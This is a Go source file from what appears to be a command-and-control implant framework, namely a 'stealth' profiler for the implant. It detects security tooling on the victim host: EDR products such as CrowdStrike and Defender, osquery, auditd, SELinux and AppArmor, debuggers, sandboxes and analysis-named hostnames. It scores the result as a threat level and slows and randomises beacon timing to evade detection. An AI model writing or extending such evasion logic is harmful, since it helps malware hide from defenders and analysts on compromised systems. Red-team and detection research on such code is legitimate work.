package stealth

import (
	"math"
	"strings"
	"sync"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
)

// Profiler performs environment profiling and defense detection.
type Profiler struct {
	mu      sync.Mutex
	cached  *beacon.TargetProfile
	lastRun time.Time
}

// NewProfiler creates a new profiler.
func NewProfiler() *Profiler {
	return &Profiler{}
}

// Profile runs all profiling phases and returns the result. Results are
// cached for `cooldown` — calling Profile again before cooldown elapses
// returns the cached profile.
func (p *Profiler) Profile(cooldown time.Duration) *beacon.TargetProfile {
	p.mu.Lock()
	if time.Since(p.lastRun) < cooldown && p.cached != nil {
		c := *p.cached
		p.mu.Unlock()
		return &c
	}
	p.mu.Unlock()

	prof := &beacon.TargetProfile{}

	phase1(prof)
	phase2(prof)
	phase3(prof)

	prof.ThreatLevel = assessThreatLevel(prof)

	p.mu.Lock()
	p.cached = prof
	p.lastRun = time.Now()
	p.mu.Unlock()

	return prof
}

// ---------------------------------------------------------------------------
// Threat level assessment (platform-agnostic)
// ---------------------------------------------------------------------------

func assessThreatLevel(p *beacon.TargetProfile) string {
	score := 0

	if p.HasAgent {
		score += 30
	}
	if p.HasAgent && len(p.AgentPids) > 2 {
		score += 15
	}
	if p.SELinux {
		score += 15
	}
	if p.AppArmor {
		score += 10
	}
	if p.Firewall != "" && p.Firewall != "none" {
		score += 5
	}

	for _, h := range p.Hints {
		lower := strings.ToLower(h)
		switch {
		case strings.Contains(lower, "edr"), strings.Contains(lower, "defender"),
			strings.Contains(lower, "crowdstrike"), strings.Contains(lower, "sentinel"),
			strings.Contains(lower, "osquery"):
			score += 10
		case strings.Contains(lower, "auditd"), strings.Contains(lower, "selinux enforcing"):
			score += 8
		case strings.Contains(lower, "kubernetes"), strings.Contains(lower, "ci environment"):
			score += 5
		case strings.Contains(lower, "sandbox"):
			score += 8
		case strings.Contains(lower, "tracer pid"):
			score += 25
		case strings.Contains(lower, "kernel lockdown"):
			score += 10
		}
	}

	if p.Hostname != "" {
		hn := strings.ToLower(p.Hostname)
		if strings.Contains(hn, "sandbox") || strings.Contains(hn, "analysis") ||
			strings.Contains(hn, "malware") || strings.Contains(hn, "infected") ||
			strings.Contains(hn, "detection") || strings.Contains(hn, "forensic") {
			score += 20
		}
	}

	switch {
	case score >= 50:
		return "critical"
	case score >= 25:
		return "high"
	case score >= 10:
		return "medium"
	default:
		return "low"
	}
}

// BeaconIntervalForThreat returns a recommended beacon interval for a threat
// level. Higher threat = longer, more randomised interval.
func BeaconIntervalForThreat(threatLevel string, baseMs int64) int64 {
	if baseMs <= 0 {
		baseMs = 60000
	}
	mult := map[string]float64{
		"low":      1.0,
		"medium":   1.5,
		"high":     2.5,
		"critical": 4.0,
	}[threatLevel]

	adjusted := float64(baseMs) * mult
	if threatLevel == "high" || threatLevel == "critical" {
		adjusted += float64(baseMs) * 0.3 * (float64(time.Now().UnixNano()%100) / 100.0)
	}
	return int64(math.Round(adjusted))
}

// QuickCheck is implemented per-platform in profiler_*.go files.
